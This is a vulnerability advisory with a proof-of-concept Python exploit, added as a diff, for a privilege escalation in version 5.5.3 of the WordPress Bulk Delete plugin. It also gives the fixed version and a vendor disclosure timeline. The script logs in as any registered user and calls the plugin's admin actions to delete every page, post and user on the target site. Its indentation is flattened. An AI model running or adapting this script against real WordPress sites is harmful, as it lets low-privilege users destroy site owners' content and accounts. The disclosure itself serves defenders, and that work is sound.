@@ -1,0 +1,134 @@
+'''
+﻿* Exploit Title: WordPress Bulk Delete Plugin [Privilege Escalation]
+* Discovery Date: 2016-02-10
+* Exploit Author: Panagiotis Vagenas
+* Author Link: https://twitter.com/panVagenas
+* Vendor Homepage: http://bulkwp.com/
+* Software Link: https://wordpress.org/plugins/bulk-delete/
+* Version: 5.5.3
+* Tested on: WordPress 4.4.2
+* Category: WebApps, WordPress
+
+
+Description
+-----------
+
+_Bulk Delete_ plugin for WordPress suffers from a privilege escalation
+vulnerability. Any registered user can exploit the lack of capabilities
+checks to perform all administrative tasks provided by the _Bulk Delete_
+plugin. Some of these actions, but not all, are:
+
+- `bd_delete_pages_by_status`: deletes all pages by status
+- `bd_delete_posts_by_post_type`: deletes all posts by type
+- `bd_delete_users_by_meta`: delete all users with a specific pair of
+meta name, meta value
+
+Nearly all actions registered by this plugin can be performed from any
+user, as long as they passed to a query var named `bd_action` and the
+user has a valid account. These actions would normally require
+administrative wrights, so we can consider this as a privilege
+escalation vulnerability.
+
+PoC
+---
+
+The following script will delete all pages, posts and users from the
+infected website.
+'''
+
+#!/usr/bin/python3
+
+################################################################################
+# Bulk Delete Privilege Escalation Exploit
+#
+# **IMPORTANT** Don't use this in a production site, if vulnerable it will
+# delete nearly all your sites content
+#
+# Author: Panagiotis Vagenas <pan.vagenas@gmail.com>
+################################################################################
+
+import requests
+
+loginUrl = 'http://example.com/wp-login.php'
+adminUrl = 'http://example.com/wp-admin/index.php'
+
+loginPostData = {
+'log': 'username',
+'pwd': 'password',
+'rememberme': 'forever',
+'wp-submit': 'Log+In'
+}
+
+l = requests.post(loginUrl, data=loginPostData)
+
+if l.status_code != 200 or len(l.history) == 0 or
+len(l.history[0].cookies) == 0:
+print("Couldn't acquire a valid session")
+exit(1)
+
+loggedInCookies = l.history[0].cookies
+
+def do_action(action, data):
+try:
+requests.post(
+adminUrl + '?bd_action=' + action,
+data=data,
+cookies=loggedInCookies,
+timeout=30
+)
+except TimeoutError:
+print('Action ' + action + ' timed out')
+else:
+print('Action ' + action + ' performed')
+
+print('Deleting all pages')
+do_action(
+'delete_pages_by_status',
+{
+'smbd_pages_force_delete': 'true',
+'smbd_published_pages': 'published_pages',
+'smbd_draft_pages': 'draft_pages',
+'smbd_pending_pages': 'pending_pages',
+'smbd_future_pages': 'future_pages',
+'smbd_private_pages': 'private_pages',
+}
+)
+
+print('Deleting all posts from all default post types')
+do_action('delete_posts_by_post_type', {'smbd_types[]': [
+'post',
+'page',
+'attachment',
+'revision',
+'nav_menu_item'
+]})
+
+print('Deleting all users')
+do_action(
+'delete_users_by_meta',
+{
+'smbd_u_meta_key': 'nickname',
+'smbd_u_meta_compare': 'LIKE',
+'smbd_u_meta_value': '',
+}
+)
+
+exit(0)
+
+
+'''
+Solution
+--------
+
+Upgrade to v5.5.4
+
+Timeline
+--------
+
+1. **2016-02-10**: Requested CVE ID
+2. **2016-02-10**: Vendor notified through wordpress.org support forums
+3. **2016-02-10**: Vendor notified through the contact form at bulkwp.com
+4. **2016-02-10**: Vendor responded and received details about the issue
+5. **2016-02-10**: Vendor verified vulnerability
+6. **2016-02-13**: Vendor released v5.5.4 which resolves this issue
+'''
